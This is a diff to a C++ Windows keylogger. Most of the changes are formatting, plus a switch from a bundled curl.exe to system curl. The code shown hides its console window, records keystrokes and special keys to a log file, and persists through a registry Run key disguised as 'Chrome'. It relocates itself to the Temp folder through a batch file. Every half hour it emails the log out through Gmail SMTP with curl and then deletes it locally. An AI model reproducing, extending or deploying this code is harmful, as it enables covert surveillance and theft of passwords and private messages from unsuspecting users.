@@ -32,7 +32,7 @@ using namespace std;
 
 
 void send() {
-	string cmd = "curl.exe smtp://smtp.gmail.com:587 --ssl-reqd -v --mail-from \\\"";
+	string cmd = "curl smtp://smtp.gmail.com:587 --ssl-reqd -v --mail-from \\\"";
 	cmd += EmailFrom;
 	cmd += "\\\" --mail-rcpt \\\"";
 	cmd += EmailTo;
@@ -66,7 +66,7 @@ void autostart() {
 	char username[UNLEN + 1];
 	DWORD username_len = UNLEN + 1;
 	GetUserName(username, &username_len);
-	
+
 	char letter[UNLEN + 1];
 	GetSystemDirectory(letter, sizeof(letter));
 
@@ -77,8 +77,8 @@ void autostart() {
 	cmd += "\\AppData\\Local\\Temp\\";
 	cmd += exe_name;
 	if (!filexits(cmd.c_str())) {
-		
-		string cmd2 = "Reg Add  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Chrome /t REG_SZ /d "+cmd;
+
+		string cmd2 = "Reg Add  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Chrome /t REG_SZ /d " + cmd;
 		system(cmd2.c_str());
 
 
@@ -87,11 +87,7 @@ void autostart() {
 		file.open("temp.bat", ios::out);
 		file << "taskkill /IM " + exe_name + " /F\n";
 		file << "move " + exe_name + " %temp%\n";
-		file <<"move curl.exe %temp%\n";
-		file << "move curl-ca-bundle.crt %temp%\n";
-		file << "move libcurl-x64.def %temp%\n";
-		file << "move libcurl-x64.dll %temp%\n";
-		file << "start  %temp%\\"+ exe_name;
+		file << "start  %temp%\\" + exe_name;
 		file << "\ndel temp.bat";
 		file << "\nexit";
 		system("start temp.bat");
@@ -120,55 +116,55 @@ bool SpecialKeys(int S_Key) {
 		LOG(" ");
 		return true;
 	case VK_RETURN:
-	//	cout << "\n";
+		//	cout << "\n";
 		LOG("\n");
 		return true;
 	case '.':
-    //cout << ".";
+		//cout << ".";
 		LOG(".");
 		return true;
 	case VK_SHIFT:
-	//	cout << "#SHIFT# ";
+		//	cout << "#SHIFT# ";
 		LOG(" #SHIFT# ");
 		return true;
 	case VK_BACK:
-	//	cout << " #BACKSPACE# ";
+		//	cout << " #BACKSPACE# ";
 		LOG(" #BACKSPACE# ");
 		return true;
 	case VK_RBUTTON:
-	//	cout << " #R_CLICK# ";
+		//	cout << " #R_CLICK# ";
 		LOG(" #R_CLICK# ");
 		return true;
 	case VK_CAPITAL:
-	//	cout << " #CAPS_LOCK# ";
+		//	cout << " #CAPS_LOCK# ";
 		LOG(" #CAPS_LOCK# ");
 		return true;
 	case VK_TAB:
-	//	cout << "#TAB#";
+		//	cout << "#TAB#";
 		LOG(" #TAB# ");
 		return true;
 	case VK_UP:
-	//	cout << "#UP#";
+		//	cout << "#UP#";
 		LOG(" #UP_ARROW# ");
 		return true;
 	case VK_DOWN:
-	//	cout << "#DOWN#";
+		//	cout << "#DOWN#";
 		LOG(" #DOWN_ARROW# ");
 		return true;
 	case VK_LEFT:
-	//	cout << "#LEFT#";
+		//	cout << "#LEFT#";
 		LOG(" #LEFT_ARROW# ");
 		return true;
 	case VK_RIGHT:
-	//	cout << " #RIGHT# ";
+		//	cout << " #RIGHT# ";
 		LOG(" #RIGHT_ARROW# ");
 		return true;
 	case VK_CONTROL:
-	//	cout << "#CONTROL#";
+		//	cout << "#CONTROL#";
 		LOG(" #CONTROL_ARROW# ");
 		return true;
 	case VK_MENU:
-	//	cout << "#ALT#";
+		//	cout << "#ALT#";
 		LOG(" #ALT# ");
 		return true;
 	default:
@@ -186,13 +182,13 @@ int main()
 {
 	ShowWindow(GetConsoleWindow(), SW_HIDE);
 	Sleep(500);
-	
+
 	fstream LogFile;
 	LogFile.open(LogFileName, fstream::app);
 	LogFile.close();
-    autostart();
+	autostart();
 	send();
-	
+
 	string jd;
 	string jd2;
 	int wynik;
@@ -208,7 +204,7 @@ int main()
 	time(&t);
 	tt = localtime(&t);
 	//Log at start of program
-	LogFile << endl <<"###" << asctime(tt);
+	LogFile << endl << "###" << asctime(tt);
 	wynik2 = asctime(tt)[0];
 	LogFile.close();
 
@@ -226,10 +222,10 @@ int main()
 		if ((wynik == 00) && (test == 1) || (wynik == 30) && (test == 1))
 		{
 			//saving data every half an hour
-			
+
 			fstream LogFile;
 			LogFile.open(LogFileName, fstream::app);
-			LogFile << endl <<"#|#" << asctime(tt);
+			LogFile << endl << "#|#" << asctime(tt);
 			LogFile.close();
 			send();
 			remove(LogFileName.c_str());
